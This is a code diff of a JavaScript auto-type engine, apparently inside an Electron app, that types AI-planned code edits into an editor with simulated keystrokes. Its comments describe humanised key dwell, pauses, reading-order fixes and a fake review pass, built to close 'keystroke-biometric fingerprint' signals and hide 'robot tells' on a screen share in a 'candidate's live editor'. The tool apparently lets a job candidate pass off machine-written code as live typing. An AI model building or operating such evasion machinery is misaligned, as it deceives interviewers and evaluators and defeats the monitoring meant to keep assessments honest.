+    try { probe = await readFocusedViaUIA(900); } catch (_) { probe = null; }
+    name = String(probe?.elementName || '');
+    focusMoved = beforeName === null || name !== beforeName;
+    if (focusMoved && GOTO_LINE_PROMPT.test(name)) break;
+    if (attempt === 0) await autoTypeSleep(180 + Math.random() * 120);
+  }
+
+  if (!focusMoved || !GOTO_LINE_PROMPT.test(name)) {
+    // Not a line prompt. Could be a find bar, could be nothing at all.
+    // Escape restores whatever was there; the caret has not moved and the
+    // document has not been touched.
+    await autoTypePressWithDwell(keyboard, Key.Escape);
+    await autoTypeNavSleep(40, 90);
+    _gotoLineUnsupported.add(who);
+    console.log(`[auto-type] nav: "${processName}" has no go-to-line on Ctrl+G (focused element was "${name.slice(0, 60)}") — walking instead, and not asking again this session`);
+    return false;
+  }
+
+  const maxLine = Number((GOTO_LINE_RANGE.exec(name) || [])[1]) || 0;
+  if (maxLine && target > maxLine) {
+    // The plan is aiming past the end of the file. Typing it would land
+    // on the last line, silently, and the edit would go to the wrong
+    // place. Better to bail out to the walk, which at least fails the
+    // same way it always has.
+    await autoTypePressWithDwell(keyboard, Key.Escape);
+    await autoTypeNavSleep(40, 90);
+    console.warn(`[auto-type] nav: target L${target} is past the end of the document (${maxLine} lines) — declining the jump`);
+    return false;
+  }
+
+  // Typed at human speed: this is a real prompt someone is filling in.
+  for (const ch of String(target)) {
+    if (autoTypeAbort) { await autoTypePressWithDwell(keyboard, Key.Escape); return false; }
+    await typeCharHumanly(keyboard, Key, ch);
+    await autoTypeSleep(70 + Math.random() * 90);
+  }
+  await autoTypeSleep(120 + Math.random() * 160);
+  await autoTypePressWithDwell(keyboard, Key.Enter);
+  await autoTypeSleep(180 + Math.random() * 160);
+  console.log(`[auto-type] nav: jumped straight to L${target}${maxLine ? ` (document has ${maxLine} lines)` : ''}`);
+  return true;
+}
+
+// ── Why the caret's CURRENT line is not used as the anchor ──
+//
+// The obvious alternative to jumping is "read where the caret already is
+// and walk the short distance". It was written, and then removed, because
+// the two numbers are not in the same coordinate system:
+//
+//   • the planner emits DOCUMENT lines, read off the editor's gutter in
+//     the screenshot (autoTypeVisionAgent.js: "1-indexed DOCUMENT line
+//     number, read from the editor gutter")
+//   • a caret line derived from UIA text is a UIA line, and on browser
+//     editors UIA starts at the first EDITABLE line — below the locked
+//     template rows the gutter is still counting
+//
+// Subtracting one from the other yields a delta that is silently wrong by
+// however many template lines the page has, and the failure is the worst
+// kind: it navigates confidently to the wrong place and deletes correct
+// code. (That is the EvenStream/OddStream incident the orphaned
+// navigateToUiaLine below was written for — against an older planner
+// contract that did count in UIA lines. It no longer does.)
+//
+// Ctrl+G takes a DOCUMENT line, which is exactly what the planner gives
+// us, so the jump needs no translation and cannot drift.
+
+// Move to a document line the way someone already working in the file
+// would: from where the caret is.
+//
+// `fromLine` is our own accounting — exact, free, and in the same
+// DOCUMENT coordinates as the target, because both come from the plan.
+// It is known for every op after the first, and null on the first, where
+// it used to mean "reset to the top and count down": twenty-nine visible
+// Down presses to reach line 30, on every run, before a character was
+// typed. That first hop now jumps instead (navigateToDocLine).
+//
+// Short hops still walk. Below about half a screen the arrows are already
+// faster than opening a prompt, and stepping a few rows is what someone
+// working in the file actually does.
+async function autoTypeGoToLine(targetLine, fromLine, ctx) {
+  const { keyboard, Key } = ctx;
+  const target = Math.max(1, targetLine | 0);
+  if (Number.isInteger(fromLine) && fromLine >= 1) {
+    const delta = target - fromLine;
+    if (delta === 0) {
+      await autoTypeGoToColumnZero(keyboard, Key);
+      return;
+    }
+    if (Math.abs(delta) <= RELATIVE_NAV_MAX_LINES) {
+      await autoTypeArrowRun(keyboard, delta > 0 ? Key.Down : Key.Up, Math.abs(delta));
+      await autoTypeGoToColumnZero(keyboard, Key);
+      console.log(`[auto-type] nav: walked ${delta > 0 ? 'down' : 'up'} ${Math.abs(delta)} line(s) from L${fromLine} to L${target} (no viewport reset)`);
+      return;
+    }
+  }
+  await navigateToDocLine(target, ctx);
+}
+
+// The beat between arriving somewhere and starting to edit. Long enough to
+// read a few lines; log-normal so it varies the way attention does.
+async function autoTypeReadRegionPause() {
+  const d = Math.min(autoTypeLogNormal(900, 0.45), 4200);
+  await autoTypeSleep(Math.round(d));
+}
+
+// ── Review pass ──
+// An experienced engineer does not stop the instant the last character
+// lands. They go back over what they changed — especially when the fix
+// spanned separate places in the file — re-read each one, and only then
+// settle. This walks back up through the edited regions, pauses on each,
+// and returns to where the work ended.
+//
+// Navigation ONLY. It presses nothing that can modify the document, so it
+// cannot damage a run that has already succeeded. Skipped for single-region
+// edits, where there is nothing to go back and forth between.
+async function autoTypeReviewPass(regions, endLine, ctx) {
+  const { keyboard, Key } = ctx;
+  try {
+    // Earliest regions first when walking back up, and cap the tour so a
+    // 12-op plan doesn't turn into a sightseeing trip.
+    const stops = regions
+      .map(r => r.line)
+      .filter(n => Number.isInteger(n) && n >= 1)
+      .sort((a, b) => a - b)
+      .slice(0, 3);
+    if (stops.length < 2) return false;
+
+    // A pause before moving — the "am I done?" beat.
+    await autoTypeSleep(500 + Math.random() * 900);
+
+    let at = Number.isInteger(endLine) ? endLine : null;
+    for (let i = stops.length - 1; i >= 0; i--) {
+      if (autoTypeAbort) return false;
+      await autoTypeGoToLine(stops[i], at, ctx);
+      at = stops[i];
+      // Re-reading a region you just wrote is quicker than reading one you
+      // haven't seen — you're checking, not comprehending.
+      await autoTypeSleep(Math.round(Math.min(autoTypeLogNormal(650, 0.40), 2600)));
+    }
+    // Settle back where the work finished, so the caret is left somewhere
+    // the candidate would expect it.
+    if (Number.isInteger(endLine) && !autoTypeAbort) {
+      await autoTypeGoToLine(endLine, at, ctx);
+      await autoTypePressWithDwell(keyboard, Key.End);
+      await autoTypeNavSleep(10, 24);
+    }
+    console.log(`[auto-type] review pass: revisited ${stops.length} edited region(s), settled back at L${endLine}`);
+    return true;
+  } catch (e) {
+    console.warn('[auto-type] review pass failed (non-fatal):', e && e.message);
+    return false;
+  }
+}
+
 async function navigateToDocLine(lineNum, ctx) {
   const { keyboard, Key } = ctx;
   const target = Math.max(1, lineNum | 0);
+
+  // Ask for the line directly first — constant-time and exact where the
+  // editor offers it, and it declines safely where it does not.
+  //
+  // Not for shallow targets, though. The jump costs a fixed ~1.2s (chord,
+  // a beat for the widget to render, two digits typed at human speed,
+  // Enter) while walking costs about 40ms per line after a ~340ms start.
+  // Those cross near line 13, so below that the walk is genuinely quicker
+  // AND shorter to watch — a three-line hop is not the crawl anyone was
+  // complaining about. Measured in real VS Code: 3.9s to walk to L47,
+  // against ~1.2s to jump there.
+  if (target >= GOTO_LINE_WORTH_IT && await autoTypeJumpToLine(target, ctx)) {
+    await autoTypeGoToColumnZero(keyboard, Key);
+    return;
+  }
+
   // Ctrl+Home combo — hold Ctrl, press Home WITH DWELL (P1a), release Home,
   // release Ctrl. Real human key dwell of ~85ms instead of the previous
   // 5-14ms — closes the #1 keystroke-biometric fingerprint signal.
-  await keyboard.pressKey(Key.LeftControl);
-  await autoTypeNavSleep(5, 14);
-  await autoTypePressWithDwell(keyboard, Key.Home);
-  await autoTypeNavSleep(5, 14);
-  await keyboard.releaseKey(Key.LeftControl);
+  await withHeldKey(keyboard, Key.LeftControl, async () => {
+    await autoTypeNavSleep(5, 14);
+    await autoTypePressWithDwell(keyboard, Key.Home);
+    await autoTypeNavSleep(5, 14);
+  });
   await autoTypeNavSleep(30, 60);
-  for (let i = 0; i < target - 1; i++) {
-    if (autoTypeAbort) break;
-    // Real dwell on each Down — previous code released the key in ~0ms
-    // which is the cleanest possible bot signature (Aalto study: human
-    // arrow-key dwell is 60-150ms, sampled log-normal).
-    await autoTypePressWithDwell(keyboard, Key.Down);
-    await autoTypeHumanNavSleep();
-  }
-  await autoTypePressWithDwell(keyboard, Key.Home);
-  await autoTypeNavSleep(10, 24);
+  // Counted Downs — deterministic landing line — but at key-repeat cadence
+  // once it's more than a hop. See autoTypeArrowRun.
+  await autoTypeArrowRun(keyboard, Key.Down, target - 1);
+  await autoTypeGoToColumnZero(keyboard, Key);
 }
 
 // ── navigateToUiaLine — the COORDINATE-SAFE navigator ──
@@ -4849,8 +6496,7 @@ async function navigateToUiaLine(targetUiaLine, ctx) {
 
   if (delta === 0) {
     // Already on the right line — just snap to column 0.
-    await autoTypePressWithDwell(keyboard, Key.Home);
-    await autoTypeNavSleep(10, 24);
+    await autoTypeGoToColumnZero(keyboard, Key);
     return;
   }
 
@@ -4862,15 +6508,118 @@ async function navigateToUiaLine(targetUiaLine, ctx) {
     console.warn(`[auto-type] navigateToUiaLine: SUSPICIOUSLY LARGE delta=${delta} — possible planner bug or UIA cursor desync. Attempting anyway.`);
   }
 
-  const dirKey = delta > 0 ? Key.Down : Key.Up;
-  const steps = Math.abs(delta);
-  for (let i = 0; i < steps; i++) {
-    if (autoTypeAbort) break;
-    await autoTypePressWithDwell(keyboard, dirKey);
-    await autoTypeHumanNavSleep();
+  await autoTypeArrowRun(keyboard, delta > 0 ? Key.Down : Key.Up, Math.abs(delta));
+  await autoTypeGoToColumnZero(keyboard, Key);
+}
+
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+//  RE-INDENTING A LINE THAT LANDED WRONG
+//
+//  Runs immediately after a block is typed, while we still know exactly
+//  where that block is. That timing is the whole design:
+//
+//  ── HOW THE COORDINATE TRAP IS AVOIDED ──
+//  The obvious way to fix line N is to look up its line number in the
+//  editor text we just read. That number is a UIA line, and on browser
+//  editors UIA starts at the first EDITABLE line while the gutter is
+//  still counting locked template rows above it — so navigating to it
+//  goes somewhere else and retypes over correct code.
+//
+//  We never compute one. The block we just typed occupies DOCUMENT lines
+//  startLine .. startLine+n-1, straight from the plan, in the same
+//  coordinates autoTypeGoToLine already navigates in. The editor read is
+//  used ONLY to decide WHICH intended line is wrong, matched by content.
+//  Line numbers never cross the boundary between the two systems.
+//
+//  ── WHY WHOLE LINES, NOT THE WHITESPACE ──
+//  Deleting "the first 8 characters because they should be whitespace"
+//  eats code the moment the count is off by one. Selecting the line and
+//  typing the intended one is the same operation a normal replace op
+//  performs, through the same tested primitives, and the result is
+//  correct even if the selection was not what we expected.
+//
+//  ── WHAT IT REFUSES ──
+//  • a non-zero block offset — the whole block sits deeper than written
+//    (valid, the editor placed it), so retyping ONE line at the intended
+//    indent would leave that line out of step with its neighbours
+//  • more than MAX_INDENT_FIXES lines — that many is not a stray line,
+//    it is something systemic, and flailing at it makes things worse
+//  • anything it cannot re-verify afterwards
+//  Every refusal falls through to telling the user, which is what
+//  happened before this existed.
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+const MAX_INDENT_FIXES = 4;
+
+async function autoTypeFixIndentation(lines, startLine, fromLine, ctx) {
+  const { keyboard, Key } = ctx;
+  if (!Array.isArray(lines) || lines.length === 0) return { fixed: 0, caretLine: fromLine };
+
+  let snap = null;
+  try { snap = await readFocusedViaUIA(1200); } catch (_) { snap = null; }
+  if (!snap || !snap.ok || typeof snap.text !== 'string' || snap.text.indexOf('\n') === -1) {
+    return { fixed: 0, caretLine: fromLine, reason: 'no_readable_text' };
   }
-  await autoTypePressWithDwell(keyboard, Key.Home);
-  await autoTypeNavSleep(10, 24);
+
+  const intended = lines.join('\n');
+  const result = compareIndentation(intended, snap.text);
+  if (!shouldReportIndent(result)) return { fixed: 0, caretLine: fromLine, reason: 'nothing_to_fix' };
+
+  if (result.offset !== 0) {
+    console.warn(`[auto-type] indent: block sits ${result.offset > 0 ? '+' : ''}${result.offset} from written, and ${result.mismatches.length} line(s) break its shape — not retyping, since fixing one line to the written indent would leave it out of step with the rest.`);
+    return { fixed: 0, caretLine: fromLine, mismatches: result.mismatches, reason: 'block_offset' };
+  }
+
+  // Which of OUR lines are wrong. Matched by content, and only where that
+  // content occurs once in the block — otherwise we cannot say which
+  // occurrence the editor read was talking about.
+  const stripWs = (s) => String(s).replace(/\s+/g, '');
+  const targets = [];
+  for (const m of result.mismatches) {
+    const key = stripWs(m.line);
+    const hits = [];
+    for (let i = 0; i < lines.length; i++) if (stripWs(lines[i]) === key) hits.push(i);
+    if (hits.length === 1) targets.push({ index: hits[0], line: lines[hits[0]] });
+  }
+  if (targets.length === 0) return { fixed: 0, caretLine: fromLine, mismatches: result.mismatches, reason: 'not_locatable' };
+  if (targets.length > MAX_INDENT_FIXES) {
+    console.warn(`[auto-type] indent: ${targets.length} line(s) off-shape — too many to be a stray, not retyping.`);
+    return { fixed: 0, caretLine: fromLine, mismatches: result.mismatches, reason: 'too_many' };
+  }
+
+  targets.sort((a, b) => a.index - b.index);
+  let caret = fromLine;
+  let fixed = 0;
+  for (const t of targets) {
+    if (autoTypeAbort) break;
+    const docLine = startLine + t.index;               // plan coordinates, start to finish
+    await autoTypeGoToLine(docLine, caret, ctx);
+    // Same select-and-replace a one-line op performs.
+    await selectLineRangeContent(docLine, docLine, ctx);
+    await autoTypeSleep(120 + Math.random() * 180);
+    await autoTypePressWithDwell(keyboard, Key.Delete);
+    await autoTypeNavSleep(18, 38);
+    await typeLinesHumanized([t.line], ctx);
+    caret = docLine;
+    fixed++;
+    console.log(`[auto-type] indent: retyped L${docLine} at the written indent — "${t.line.trim().slice(0, 40)}"`);
+  }
+
+  // Did it actually take? A fix reported without checking is exactly the
+  // silent-success this whole check exists to remove.
+  let after = null;
+  try { after = await readFocusedViaUIA(1200); } catch (_) { after = null; }
+  const recheck = (after && after.ok && typeof after.text === 'string')
+    ? compareIndentation(intended, after.text)
+    : null;
+  const stillWrong = recheck ? shouldReportIndent(recheck) : true;
+
+  return {
+    fixed,
+    caretLine: caret,
+    verified: !!recheck && !stillWrong,
+    mismatches: stillWrong ? (recheck ? recheck.mismatches : result.mismatches) : [],
+    reason: stillWrong ? (recheck ? 'still_wrong' : 'unverified') : 'fixed',
+  };
 }
 
 // Select the CONTENT of document lines [s..e] — from (s,0) through the
@@ -4882,18 +6631,19 @@ async function navigateToUiaLine(targetUiaLine, ctx) {
 async function selectLineRangeContent(s, e, ctx) {
   const { keyboard, Key } = ctx;
   const span = Math.max(0, (e | 0) - (s | 0));
-  await keyboard.pressKey(Key.LeftShift);
-  await autoTypeHumanNavSleep();
-  for (let i = 0; i < span; i++) {
-    if (autoTypeAbort) break;
-    // Real dwell per arrow (P1a). Shift stays held throughout the loop —
-    // that's the natural pattern for range selection.
-    await autoTypePressWithDwell(keyboard, Key.Down);
+  // Shift stays held across the run — that's the natural pattern for range
+  // selection, and holding Shift+Down is exactly what a person does to grab
+  // a block. autoTypeArrowRun only touches the arrow key, so the modifier
+  // is unaffected; it just stops the selection being tapped out one
+  // deliberate row at a time on a 30-line range.
+  // This is the LONGEST hold in the file — a whole arrow run plus an End —
+  // so it is also the one with the most chances to throw partway through.
+  await withHeldKey(keyboard, Key.LeftShift, async () => {
     await autoTypeHumanNavSleep();
-  }
-  await autoTypePressWithDwell(keyboard, Key.End);
-  await autoTypeHumanNavSleep();
-  await keyboard.releaseKey(Key.LeftShift);
+    await autoTypeArrowRun(keyboard, Key.Down, span);
+    await autoTypePressWithDwell(keyboard, Key.End);
+    await autoTypeHumanNavSleep();
+  });
   await autoTypeNavSleep(10, 22);
 }
 
@@ -5001,7 +6751,7 @@ async function executeMultiOpPlan(operations, ctx) {
   }
   if (validated.length === 0) {
     console.warn('[auto-type] multi-op: all ops dropped by validation — nothing to do');
-    return { typed: '', opCount: 0 };
+    return { typed: '', opCount: 0, executionTrace: [{ kind: 'no_ops', reason: 'all_dropped_by_overlap_validation' }] };
   }
   if (validated.length !== (operations || []).length) {
     console.log(`[auto-type] multi-op: ${operations.length - validated.length} op(s) dropped by validation, ${validated.length} will execute`);
@@ -5050,7 +6800,7 @@ async function executeMultiOpPlan(operations, ctx) {
   }
   if (safeOps.length === 0) {
     console.warn('[auto-type] multi-op: all ops refused by structural-line safety filter — nothing safe to do');
-    return { typed: '', opCount: 0 };
+    return { typed: '', opCount: 0, executionTrace: [{ kind: 'no_ops', reason: 'all_refused_by_structural_filter' }] };
   }
   if (safeOps.length !== ops.length) {
     console.log(`[auto-type] multi-op: structural-line filter dropped ${ops.length - safeOps.length} unsafe op(s); ${safeOps.length} will execute`);
@@ -5101,7 +6851,7 @@ async function executeMultiOpPlan(operations, ctx) {
   }
   if (finalOps.length === 0) {
     console.log('[auto-type] multi-op: all ops were no-op rewrites — editor already matches target, nothing to type');
-    return { typed: '', opCount: 0 };
+    return { typed: '', opCount: 0, executionTrace: [{ kind: 'no_ops', reason: 'all_no_op_rewrites' }] };
   }
 
   // ── Guard C: content-loss safety refusal (Stage 1) ──
@@ -5138,7 +6888,7 @@ async function executeMultiOpPlan(operations, ctx) {
       console.error(`[auto-type] multi-op: CONTENT-LOSS GUARD tripped — destructive ops would net-remove ${netRemoved}/${totalNonWs} non-whitespace chars (${Math.round(100 * netRemoved / totalNonWs)}% of the editor) without reproducing them. Refusing ${destructive.length} destructive op(s) to avoid wiping required code.`);
       const insertsOnly = finalOps.filter(o => o.op === 'insert');
       if (insertsOnly.length === 0) {
-        return { typed: '', opCount: 0, refused: 'content_loss_guard' };
+        return { typed: '', opCount: 0, refused: 'content_loss_guard', executionTrace: [{ kind: 'refused', reason: 'content_loss_guard' }] };
       }
       finalOps.length = 0;
       finalOps.push(...insertsOnly);
@@ -5147,10 +6897,83 @@ async function executeMultiOpPlan(operations, ctx) {
     console.log('[auto-type] multi-op: content-loss guard skipped — UIA not reliable for measurement (browser-hosted, flat/truncated, or partial coverage). Trusting the vision plan.');
   }
 
+  // Per-op execution trace. autoTypePlanLog documents this field in its
+  // reader contract but nothing ever wrote it, so a failed run recorded a
+  // before and an after with no record of WHICH op broke. Cheap to build,
+  // and it is the difference between diagnosing a bad run in one read and
+  // guessing at it.
+  const executionTrace = [];
+  if (validated.length !== (operations || []).length) {
+    executionTrace.push({ kind: 'dropped_overlapping', count: (operations || []).length - validated.length });
+  }
+  if (safeOps.length !== ops.length) {
+    executionTrace.push({ kind: 'dropped_structural', count: ops.length - safeOps.length });
+  }
+  if (noOpSkipped > 0) executionTrace.push({ kind: 'skipped_no_op_rewrite', count: noOpSkipped });
+
+  // ── Execution order: READING ORDER, with exact line-shift accounting ──
+  //
+  // This used to run strictly bottom-to-top. That is the easy way to keep
+  // line numbers valid — edit the lowest region first and nothing above it
+  // moves — but on a screen share it is a tell: given two broken blocks,
+  // the engine fixed the SECOND one first, and it re-anchored with
+  // Ctrl+Home before every op, snapping the viewport back to the top of
+  // the file each time.
+  //
+  // A person fixes the first problem they read, then works downward. That
+  // ordering is available as long as we account for how many lines each
+  // edit adds or removes, and shift every later anchor by the running
+  // total. The arithmetic is exact, not estimated:
+  //     replace [s..e] with T lines -> T - (e - s + 1)
+  //     delete  [s..e]              -> -(e - s + 1)
+  //     insert  after s, T lines    -> +T
+  //
+  // The plan-level checks above (structural filter, no-op detection,
+  // content-loss guard) all compare ORIGINAL line numbers against the
+  // pre-run UIA snapshot and complete before any keystroke, so they are
+  // unaffected by execution order.
+  const orderedOps = finalOps.slice().sort((a, b) => a.start_line - b.start_line);
+  let lineShift = 0;
+  // Line the caret sits on, tracked so we can walk to the next region from
+  // where we already are instead of resetting to the top of the document.
+  // null = unknown, which forces the absolute navigator.
+  let caretLine = null;
+  const editedRegions = [];
+  // Indentation repaired inline, and anything left over — reported at the
+  // end so the user hears about it once, not once per op.
+  let indentRepairs = 0;
+  const indentUnfixed = [];
+
+  // Called by EVERY path that types a block, with that block's first
+  // DOCUMENT line. Three paths type code — insert, whole-document replace,
+  // and ordinary replace — and each knows exactly where its block landed:
+  //   insert          → s + 1   (Enter created the line below s)
+  //   whole-doc Ctrl+A→ 1       (the document is the block)
+  //   replace         → s
+  // That number is the only coordinate involved, and it comes from the
+  // plan, never from reading the editor. See autoTypeFixIndentation.
+  const fixIndentation = async (lines, blockStartLine) => {
+    if (autoTypeAbort) return;
+    try {
+      const ind = await autoTypeFixIndentation(lines, blockStartLine, caretLine, ctx);
+      if (ind.fixed > 0) {
+        caretLine = ind.caretLine;
+        indentRepairs += ind.fixed;
+        executionTrace.push({ opIndex: done, kind: 'indent_fix', lines: ind.fixed, verified: !!ind.verified });
+      }
+      // Whatever is still wrong after the attempt — or was refused — is
+      // what the user gets told about at the end.
+      if (ind.mismatches && ind.mismatches.length) indentUnfixed.push(...ind.mismatches);
+    } catch (indErr) {
+      console.warn('[auto-type] indent fix threw (non-fatal):', indErr && indErr.message);
+    }
+  };
+
   let typedAll = '';
   let done = 0;
-  for (const op of finalOps) {
+  for (const op of orderedOps) {
     if (autoTypeAbort) break;
+    const opStartMs = Date.now();
 
     // ── Per-op focus re-check ──
     // A multi-op run can span many seconds. The handler's preflight ran
@@ -5169,33 +6992,42 @@ async function executeMultiOpPlan(operations, ctx) {
       break;
     }
 
-    const s = Math.max(1, op.start_line | 0);
-    const e = Math.max(s, op.end_line | 0);
+    // Anchors shift by everything already applied above this region.
+    const s = Math.max(1, (op.start_line | 0) + lineShift);
+    const e = Math.max(s, (op.end_line | 0) + lineShift);
+    const origSpan = Math.max(1, (op.end_line | 0) - (op.start_line | 0) + 1);
 
     if (op.op === 'insert') {
-      await navigateToDocLine(s, ctx);
+      await autoTypeGoToLine(s, caretLine, ctx);
+      await autoTypeReadRegionPause();
       // P1a: dwell on each key in the insert sequence.
       await autoTypePressWithDwell(keyboard, Key.End);
       await autoTypeNavSleep(10, 24);
       await autoTypePressWithDwell(keyboard, Key.Enter);
       await autoTypeNavSleep(38, 70);
-      // Wipe any auto-indent the editor inserted — the op text carries
-      // its own indentation.
+      // SELECT the auto-indent the editor inserted — the op text carries
+      // its own indentation, so the first typed character replaces this.
+      // Deleting it instead would forward-delete the following line
+      // whenever the editor did not auto-indent (see autoTypeLineBreak).
       await autoTypePressWithDwell(keyboard, Key.Home);
       await autoTypeNavSleep(10, 22);
-      await keyboard.pressKey(Key.LeftShift);
-      await autoTypeNavSleep(4, 10);
-      await autoTypePressWithDwell(keyboard, Key.End);
-      await autoTypeNavSleep(4, 10);
-      await keyboard.releaseKey(Key.LeftShift);
+      await withHeldKey(keyboard, Key.LeftShift, async () => {
+        await autoTypeNavSleep(4, 10);
+        await autoTypePressWithDwell(keyboard, Key.End);
+        await autoTypeNavSleep(4, 10);
+      });
       await autoTypeNavSleep(10, 22);
-      await autoTypePressWithDwell(keyboard, Key.Delete);
-      await autoTypeNavSleep(14, 30);
       const lines = String(op.text || '').split('\n');
       await typeLinesHumanized(lines, ctx);
       typedAll += lines.join('\n') + '\n';
       done++;
-      console.log(`[auto-type] multi-op ${done}/${ops.length}: insert after L${s} (${lines.length} line(s)) — ${op.reason || ''}`);
+      // Enter created line s+1; the T typed lines occupy s+1 .. s+T.
+      caretLine = s + lines.length;
+      await fixIndentation(lines, s + 1);
+      lineShift += lines.length;
+      editedRegions.push({ line: s + 1, label: `insert after L${op.start_line}` });
+      executionTrace.push({ opIndex: done, kind: 'insert', startLine: s, endLine: s, lines: lines.length, charsTyped: lines.join('\n').length, lineDelta: lines.length, durationMs: Date.now() - opStartMs });
+      console.log(`[auto-type] multi-op ${done}/${orderedOps.length}: insert after L${s} (${lines.length} line(s), shift now ${lineShift >= 0 ? '+' : ''}${lineShift}) — ${op.reason || ''}`);
       continue;
     }
 
@@ -5226,11 +7058,17 @@ async function executeMultiOpPlan(operations, ctx) {
     }
     if (op.op === 'replace' && uiaLines && uiaLines.length === 1 && s === 1 && !browserHosted) {
       console.log(`[auto-type] multi-op ${done + 1}/${ops.length}: replace L1-${e} via Ctrl+A (flat-UIA whole-doc path, ${uiaLines[0].length} chars in single logical line, native editor "${processName || '?'}") — ${op.reason || ''}`);
-      await keyboard.pressKey(Key.LeftControl);
-      await autoTypeNavSleep(5, 14);
-      await autoTypePressWithDwell(keyboard, Key.A);
-      await autoTypeNavSleep(5, 14);
-      await keyboard.releaseKey(Key.LeftControl);
+      // The Delete two statements below is why this hold in particular
+      // cannot be left bare. If the "A" press throws, Ctrl is released in
+      // withHeldKey's finally AND the throw carries execution straight out
+      // of this block — so Delete is never reached at all, let alone
+      // reached as Ctrl+Delete, which in the candidate's live editor is
+      // delete-word-forward against a document we did not select.
+      await withHeldKey(keyboard, Key.LeftControl, async () => {
+        await autoTypeNavSleep(5, 14);
+        await autoTypePressWithDwell(keyboard, Key.A);
+        await autoTypeNavSleep(5, 14);
+      });
       await autoTypeNavSleep(40, 80);
       // Glance pause before deleting selection — humans look at what
       // they highlighted before nuking it.
@@ -5241,11 +7079,25 @@ async function executeMultiOpPlan(operations, ctx) {
       await typeLinesHumanized(lines, ctx);
       typedAll += lines.join('\n') + '\n';
       done++;
+      caretLine = lines.length;
+      // Ctrl+A wiped the document, so the block IS the document — it
+      // starts at line 1.
+      await fixIndentation(lines, 1);
+      lineShift += lines.length - origSpan;
+      editedRegions.push({ line: 1, label: 'whole-document replace' });
+      executionTrace.push({ opIndex: done, kind: 'replace_ctrl_a', startLine: 1, endLine: e, lines: lines.length, charsTyped: lines.join('\n').length, durationMs: Date.now() - opStartMs });
       continue;
     }
 
     // replace / delete — both select the content of [s..e] first.
-    await navigateToDocLine(s, ctx);
+    // Walk from wherever the caret already is; fall back to the absolute
+    // Ctrl+Home anchor only when that distance is unknown or too far to be
+    // a plausible keyboard move.
+    await autoTypeGoToLine(s, caretLine, ctx);
+    // Arriving at a region: read it before touching it. A person looks at
+    // broken code, then edits. Selecting the instant the caret lands is the
+    // most mechanical-looking beat in a multi-block run.
+    await autoTypeReadRegionPause();
     await selectLineRangeContent(s, e, ctx);
     // Glance pause — a human looks at what they've highlighted before
     // hitting Delete. Selecting then instantly deleting is a robot tell.
@@ -5261,7 +7113,12 @@ async function executeMultiOpPlan(operations, ctx) {
       await autoTypePressWithDwell(keyboard, Key.Delete);
       await autoTypeNavSleep(14, 30);
       done++;
-      console.log(`[auto-type] multi-op ${done}/${ops.length}: delete L${s}-${e} — ${op.reason || ''}`);
+      // The region is gone; following content rose into line s.
+      caretLine = s;
+      lineShift -= origSpan;
+      editedRegions.push({ line: s, label: `delete L${op.start_line}-${op.end_line}` });
+      executionTrace.push({ opIndex: done, kind: 'delete', startLine: s, endLine: e, charsTyped: 0, lineDelta: -origSpan, durationMs: Date.now() - opStartMs });
+      console.log(`[auto-type] multi-op ${done}/${orderedOps.length}: delete L${s}-${e} (shift now ${lineShift >= 0 ? '+' : ''}${lineShift}) — ${op.reason || ''}`);
     } else {
       // replace — caret at (s,0), content of s..e gone, the newline
       // before old line e+1 preserved. Type the replacement; line e+1
@@ -5270,10 +7127,26 @@ async function executeMultiOpPlan(operations, ctx) {
       await typeLinesHumanized(lines, ctx);
       typedAll += lines.join('\n') + '\n';
       done++;
-      console.log(`[auto-type] multi-op ${done}/${ops.length}: replace L${s}-${e} with ${lines.length} line(s) — ${op.reason || ''}`);
+      // The T typed lines occupy s .. s+T-1.
+      caretLine = s + lines.length - 1;
+
+      // Re-indent anything that landed off-shape NOW, while this block's
+      // document lines are still exactly s..s+T-1 and no later op has
+      // shifted them.
+      await fixIndentation(lines, s);
+
+      lineShift += lines.length - origSpan;
+      editedRegions.push({ line: s, label: `replace L${op.start_line}-${op.end_line}` });
+      executionTrace.push({ opIndex: done, kind: 'replace', startLine: s, endLine: e, lines: lines.length, charsTyped: lines.join('\n').length, lineDelta: lines.length - origSpan, durationMs: Date.now() - opStartMs });
+      console.log(`[auto-type] multi-op ${done}/${orderedOps.length}: replace L${s}-${e} with ${lines.length} line(s) (shift now ${lineShift >= 0 ? '+' : ''}${lineShift}) — ${op.reason || ''}`);
     }
   }
-  return { typed: typedAll, opCount: done };
+  if (autoTypeAbort) executionTrace.push({ kind: 'aborted', afterOps: done, reason: autoTypeAbortReason || 'unknown' });
+  else if (editedRegions.length >= 2) {
+    await autoTypeReviewPass(editedRegions, caretLine, ctx);
+    executionTrace.push({ kind: 'review_pass', regions: editedRegions.length });
+  }
+  return { typed: typedAll, opCount: done, executionTrace, indentRepairs, indentUnfixed };
 }
 
 function planAutoTypeFromUIA(params) {
@@ -5700,6 +7573,22 @@ async function autoTypeSurgicalBracketRepair(intendedCode, language, ctx) {
       return { ok: false, reason: 'uia_unavailable' };
     }
 
+    // ── Reliability gate ──
+    // Bracket balance is only meaningful over the WHOLE document. Browser-
+    // hosted Monaco / CodeMirror expose just the scrolled-visible slice via
+    // UIA, and an arbitrary slice of code virtually always looks unbalanced.
+    // Repairing against that would INSERT or DELETE braces in a file that
+    // was fine — active damage, not a fix. Same gate the coverage check
+    // uses. (A clipboard read would lift this restriction; it is the right
+    // follow-up, but it must not be guessed at from a partial read.)
+    const brProcName = String(after.processName || '');
+    if (/(^|\b)(chrome|msedge|edge|firefox|brave|opera|vivaldi|arc)(\b|$)/i.test(brProcName)) {
+      return { ok: false, reason: 'browser_hosted_uia_truncated' };
+    }
+    if (isUiaPlaceholderText(after.text)) {
+      return { ok: false, reason: 'uia_placeholder' };
+    }
+
     const intendedBal = bracketTracker.balance(intendedCode, language);
     const actualBal = bracketTracker.balance(after.text, language);
 
@@ -5953,6 +7842,22 @@ ipcMain.handle('db:get-active-session', (_event, userId) => {
 
 ipcMain.handle('db:list-sessions', (_event, userId) => {
   return database.listSessionsForUser(userId);
+});
+
+// Conversations the phone wrote while this machine was off. The renderer
+// fetches them (it holds the auth token); the main process owns the
+// database, so the write happens here.
+ipcMain.handle('db:known-session-ids', (_event, ids, userId) => {
+  return database.knownSessionIds(ids, userId);
+});
+
+ipcMain.handle('db:import-remote-session', (_event, payload) => {
+  const result = database.importRemoteSession(payload || {});
+  // Only wake the sidebar when something actually landed — this runs on
+  // a timer, and a broadcast per tick would re-render the session list
+  // forever for no reason.
